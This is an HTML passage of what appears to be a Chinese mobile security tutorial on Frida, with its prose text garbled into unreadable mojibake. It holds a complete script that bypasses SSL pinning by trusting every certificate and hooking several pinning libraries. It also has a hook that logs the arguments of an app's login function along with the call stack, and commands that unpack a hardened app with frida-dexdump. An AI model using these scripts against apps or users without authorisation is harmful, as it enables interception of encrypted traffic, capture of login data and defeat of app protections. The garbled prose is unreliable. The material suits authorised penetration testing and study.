class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;***********************************&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Start Bypass SSL Pinning Nowing *&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;***********************************&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> X509TrustManager = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.net.ssl.X509TrustManager&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">SSLContext</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.net.ssl.SSLContext&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">TrustManager</span> = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;com.test.TrustManager&#x27;</span>,</span><br><span class="line">        <span class="attr">implements</span>: [X509TrustManager],</span><br><span class="line">        <span class="attr">methods</span>: &#123;</span><br><span class="line">            <span class="attr">checkClientTrusted</span>: <span class="keyword">function</span> (<span class="params">chain, authType</span>) &#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">checkServerTrusted</span>: <span class="keyword">function</span> (<span class="params">chain, authType</span>) &#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">getAcceptedIssuers</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> [];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">TrustManagers</span> = [<span class="title class_">TrustManager</span>.$new()];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">SSLContext</span>_init = <span class="title class_">SSLContext</span>.<span class="property">init</span>.<span class="title function_">overload</span>(</span><br><span class="line">        <span class="string">&#x27;[Ljavax.net.ssl.KeyManager;&#x27;</span>, <span class="string">&#x27;[Ljavax.net.ssl.TrustManager;&#x27;</span>, <span class="string">&#x27;java.security.SecureRandom&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="title class_">SSLContext</span>_init.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">keyManager, trustManager, secureRandom</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;! Intercepted trustmanager request&#x27;</span>);</span><br><span class="line">        <span class="title class_">SSLContext</span>_init.<span class="title function_">call</span>(<span class="variable language_">this</span>, keyManager, <span class="title class_">TrustManagers</span>, secureRandom);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Setup custom trust manager&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">CertificatePinner</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;okhttp3.CertificatePinner&#x27;</span>);</span><br><span class="line">        <span class="title class_">CertificatePinner</span>.<span class="property">check</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.util.List&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;! Intercepted okhttp3: &#x27;</span> + str);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Setup okhttp3 pinning&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Unable to hook into okhttp3 pinner&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Activity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.datatheorem.android.trustkit.pinning.OkHostnameVerifier&quot;</span>);</span><br><span class="line">        <span class="title class_">Activity</span>.<span class="property">verify</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;! Intercepted trustkit&#123;1&#125;: &#x27;</span> + str);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Activity</span>.<span class="property">verify</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.security.cert.X509Certificate&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;! Intercepted trustkit&#123;2&#125;: &#x27;</span> + str);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Setup trustkit pinning&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Unable to hook into trustkit pinner&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">TrustManagerImpl</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.android.org.conscrypt.TrustManagerImpl&#x27;</span>);</span><br><span class="line">        <span class="title class_">TrustManagerImpl</span>.<span class="property">verifyChain</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;! Intercepted TrustManagerImp: &#x27;</span> + host);</span><br><span class="line">            <span class="keyword">return</span> untrustedChain;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Setup TrustManagerImpl pinning&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Unable to hook into TrustManagerImpl&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">PinningTrustManager</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;appcelerator.https.PinningTrustManager&#x27;</span>);</span><br><span class="line">        <span class="title class_">PinningTrustManager</span>.<span class="property">checkServerTrusted</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;! Intercepted Appcelerator&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Setup Appcelerator pinning&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Unable to hook into Appcelerator pinning&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>åœ¨ APP å¯ç”¨äº† SSL Pinning æ—¶ï¼Œæ— æ³•é€šè¿‡ Burp æˆ– Fiddle ç­‰æŠ“åŒ…å·¥å…·è¿›è¡Œç›´æ¥æŠ“å– Https çš„æµé‡åŒ…çš„ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231128201936123.png" data-caption="image-20231128201936123"><img src="/../images/mobile/frida/1/image-20231128201936123.png" alt="image-20231128201936123"></a></p><p>1ã€å¯åŠ¨æœåŠ¡ç«¯</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231127205755131.png" data-caption="image-20231127205755131"><img src="/../images/mobile/frida/1/image-20231127205755131.png" alt="image-20231127205755131"></a></p><p>ç¼–å†™ frida è„šæœ¬ï¼Œç»•è¿‡ SSL Pinningã€‚åœ¨ç”µè„‘ä¸Šå¯åŠ¨ frida å®¢æˆ·ç«¯ï¼Œå¯¹è¯¥ app æ³¨å…¥ SSL Pinning è„šæœ¬ï¼Œç»•è¿‡å…¶é™åˆ¶ã€‚åœ¨å¯åŠ¨å‰å…ˆæ‰§è¡Œ frida-ps -Uia æŸ¥æ‰¾æ­£åœ¨è¿è¡Œçš„ APP æ‰¾åˆ°æˆ‘ä»¬éœ€è¦ç»•è¿‡çš„ APP çš„åŒ…å</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240216164737.jpg" data-caption="å¾®ä¿¡å›¾ç‰‡_20240216164737"><img src="/../images/mobile/frida/1/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240216164737.jpg" alt="å¾®ä¿¡å›¾ç‰‡_20240216164737"></a></p><p>è„šæœ¬ä»£ç ä¸Šæ–‡å·²åˆ—å‡ºï¼Œæš‚å‘½åä¸º Bypass.jsï¼Œå¯åŠ¨è„šæœ¬åæ‰‹æœºè‡ªåŠ¨å¯åŠ¨ APPï¼Œç„¶åå†è¿è¡Œä¸­æ³¨å…¥ç»•è¿‡ä»£ç </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.appåŒ…å.xxxx -l Bypass.js</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231128202355240-17077199387342.png" data-caption="image-20231128202355240"><img src="/../images/mobile/frida/1/image-20231128202355240-17077199387342.png" alt="image-20231128202355240"></a></p><p>æˆåŠŸæŠ“å–åˆ° Https æµé‡</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231128202609642-17077200954044.png" data-caption="image-20231128202609642"><img src="/../images/mobile/frida/1/image-20231128202609642-17077200954044.png" alt="image-20231128202609642"></a></p><h3 id="è¿½è¸ªåŠ å¯†å‡½æ•°"><a href="#è¿½è¸ªåŠ å¯†å‡½æ•°" class="headerlink" title="è¿½è¸ªåŠ å¯†å‡½æ•°"></a>è¿½è¸ªåŠ å¯†å‡½æ•°</h3><p>å¯¹æŸä¸€ APP åŠ å¯†å‡½æ•°è¿›è¡Œè¿½è¸ªï¼Œä»£ç å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231209122317290.png" data-caption="image-20231209122317290"><img src="/../images/mobile/frida/1/image-20231209122317290.png" alt="image-20231209122317290"></a></p><p>ç›´æ¥å³é”®å¤åˆ¶ä¸º frida ä»£ç </p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231209122204941.png" data-caption="image-20231209122204941"><img src="/../images/mobile/frida/1/image-20231209122204941.png" alt="image-20231209122204941"></a></p><p>è‡ªåŠ¨å¤åˆ¶çš„ frida è„šæœ¬ä»£ç ä¸ºï¼Œæ³¨æ„ m12903a æ–¹æ³•ååœ¨ç¨‹åºè¿è¡Œç¼–è¯‘æ—¶è¢«é‡è½½ä¸º a ï¼Œç”±ä¸Šå›¾ renamed fromï¼ša* å¯ä¸­ï¼Œæ‰€ä»¥ fridaè„šæœ¬åœ¨ç¼–å†™æ—¶ï¼Œm12903a éœ€è¦æ›¿æ¢ä¸º a</p><div class="highlight-wrap" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">LoginActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.æ–¹æ³•å.LoginActivity&quot;</span>);</span><br><span class="line"><span class="title class_">LoginActivity</span>[<span class="string">&quot;a&quot;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str, str2, str3</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`LoginActivity.m12903a is called: str=<span class="subst">$&#123;str&#125;</span>, str2=<span class="subst">$&#123;str2&#125;</span>, str3=<span class="subst">$&#123;str3&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">this</span>[<span class="string">&quot;a&quot;</span>](str, str2, str3);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>ä¿®æ”¹å®Œå–„ä»£ç </p><div class="highlight-wrap" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script Start Nowing&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">LoginActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.æ–¹æ³•å.LoginActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">LoginActivity</span>.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str, str2, str3</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;LoginActivity.m12903a results are as follows&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str: &quot;</span> + str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str2: &quot;</span> + str2);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str3: &quot;</span> + str3);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;---------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨åŸå§‹æ–¹æ³•</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">a</span>(str, str2, str3);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>ä½¿ç”¨è„šæœ¬è¿›è¡Œ Hook,æˆåŠŸè¾“å‡º m12903a æ–¹æ³•çš„ç»“æœ</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231209123411245-17077210950026.png" data-caption="image-20231209123411245"><img src="/../images/mobile/frida/1/image-20231209123411245-17077210950026.png" alt="image-20231209123411245"></a></p><p>ç°å·²çŸ¥å‡½æ•°èƒ½è¢«æ­£å¸¸ Hookï¼Œç»§ç»­è¿›ä¸€æ­¥è¿½è¸ªç¨‹åºåœ¨è°ƒç”¨ m12903a æ–¹æ³•æ—¶çš„è°ƒç”¨æ ˆæƒ…å†µ</p><div class="highlight-wrap" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script Start Nowing&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">LoginActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.æ–¹æ³•å.LoginActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">LoginActivity</span>.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str, str2, str3</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;------------------------------------------------------------------------------------------------------------&quot;</span>);        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;LoginActivity.m12903a results are as follows&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;------------------------------------------------------------------------------------------------------------&quot;</span>);        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str: &quot;</span> + str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str2: &quot;</span> + str2);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str3: &quot;</span> + str3);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨åŸå§‹æ–¹æ³•</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">a</span>(str, str2, str3);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// æ‰“å°è°ƒç”¨æ ˆ</span></span><br><span class="line">            <span class="keyword">var</span> stackTrace = <span class="title class_">Exception</span>.$new().<span class="title function_">getStackTrace</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;------------------------------------------------------------------------------------------------------------&quot;</span>);        </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;LoginActivity.m12903a call stack results:&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;------------------------------------------------------------------------------------------------------------&quot;</span>);        </span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stackTrace.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(stackTrace[i].<span class="title function_">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Error occurred while printing call stack: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231209130052729-17077213012428.png" data-caption="image-20231209130052729"><img src="/../images/mobile/frida/1/image-20231209130052729-17077213012428.png" alt="image-20231209130052729"></a></p><h3 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h3><h4 id="frida-dexdump"><a href="#frida-dexdump" class="headerlink" title="frida-dexdump"></a>frida-dexdump</h4><p>frida-dexdump æ˜¯ä¸€ä¸ªåŸºäº Frida çš„å®‰å…¨å·¥å…·ï¼Œå¯é€šè¿‡æŸ¥æ‰¾å¹¶è½¬å‚¨å†…å­˜ä¸­çš„dexæ–‡ä»¶ä»¥å®ç°è„±å£³ã€‚æµ‹è¯•ç›®æ ‡ä½¿ç”¨ 360 åŠ å›ºï¼Œå°è¯•åˆ©ç”¨ frida-dexdump è¿›è¡Œè„±å£³ã€‚é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/hluwa/frida-dexdump">https://github.com/hluwa/frida-dexdump</a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204204118906-170772140865410.png" data-caption="image-20231204204118906"><img src="/../images/mobile/frida/1/image-20231204204118906-170772140865410.png" alt="image-20231204204118906"></a></p><p>1ã€åœ¨å®‰è£…å®Œ frida ç¯å¢ƒçš„åŸºç¡€ä¸Š(è¿™ä¸€éƒ¨åˆ†å°±æ˜¯ä¸Šé¢ â€œå·¥å…·å®‰è£…â€ ç« èŠ‚)ï¼Œç„¶åç›´æ¥åˆ©ç”¨ pip å¯ä¸€é”®å®‰è£… frida-dexdump</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida-dexdump</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204203656939.png" data-caption="image-20231204203656939"><img src="/../images/mobile/frida/1/image-20231204203656939.png" alt="image-20231204203656939"></a></p><p>2ã€åˆ©ç”¨ adb è¿æ¥ Android ï¼Œç„¶åå†å¯åŠ¨ frida-server</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell</span><br><span class="line">cd data/app_test</span><br><span class="line">./frida-server-16.1.6-android-arm64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204204558680.png" data-caption="image-20231204204558680"><img src="/../images/mobile/frida/1/image-20231204204558680.png" alt="image-20231204204558680"></a></p><p>3ã€Android æ‰‹æœºä¸Šè¿è¡Œéœ€è¦æµ‹è¯•çš„ APPï¼Œç„¶ååˆ©ç”¨ frida-tools æŸ¥çœ‹è¯¥ç¨‹åºè¿è¡Œçš„ PID å·ï¼Œå·²çŸ¥ PID å·ä¸º 11256</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204205154000-170772151925312.png" data-caption="image-20231204205154000"><img src="/../images/mobile/frida/1/image-20231204205154000-170772151925312.png" alt="image-20231204205154000"></a></p><p>4ã€åˆ©ç”¨ <code>frida-dexdump</code> è¿›è¡Œè„±å£³å¤„ç†,å‘½ä»¤å¦‚ä¸‹ï¼Œè¿™é‡Œé€‰æ‹© <code>frida-dexdump -U -p 11265</code> </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-dexdump -U -p PID</span><br></pre></td></tr></table></figure></div><p>ç”±äº APP å­˜åœ¨ SSL Pinning æ£€æµ‹ï¼Œå¯¼è‡´è„±å£³å¤±è´¥ï¼Œè¿™è¾¹éœ€è¦å…ˆè¿›è¡ŒBypass SSL Pinning ç„¶åå†è¿è¡Œ frida-dexdump è¿›è¡Œè„±å£³å¤„ç†</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204210236674.png" data-caption="image-20231204210236674"><img src="/../images/mobile/frida/1/image-20231204210236674.png" alt="image-20231204210236674"></a></p><p>Bypass SSL Pinning ï¼Œè¿™è¾¹ç›´æ¥ä½¿ç”¨è„šæœ¬ Hook ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨ Objection è¿›è¡Œ Hook</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f cn.xx.xxx -l Bypass.js</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204210507093-170772168463414.png" data-caption="image-20231204210507093"><img src="/../images/mobile/frida/1/image-20231204210507093-170772168463414.png" alt="image-20231204210507093"></a></p><p>å†æ¬¡è¿è¡Œ frida-dexdump è¿›è¡Œ dump dex</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br><span class="line">frida-dexdump -U -p PID</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204210719257-170772176827616.png" data-caption="image-20231204210719257"><img src="/../images/mobile/frida/1/image-20231204210719257-170772176827616.png" alt="image-20231204210719257"></a></p><p>æœ€ååˆ©ç”¨ jadx è¿›è¡Œåç¼–è¯‘æŸ¥çœ‹ dex ä»£ç ï¼Œå…·ä½“è„±å£³æ•ˆæœå¦‚ä½•ï¼Œåªèƒ½ç¥ˆæ±‚ä¸Šå¤©çš„æ©èµäº†ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204210740033.png" data-caption="image-20231204210740033"><img src="/../images/mobile/frida/1/image-20231204210740033.png" alt="image-20231204210740033"></a></p><h2 id="å…­ã€å‚è€ƒ"><a href="#å…­ã€å‚è€ƒ" class="headerlink" title="å…­ã€å‚è€ƒ"></a>å…­ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 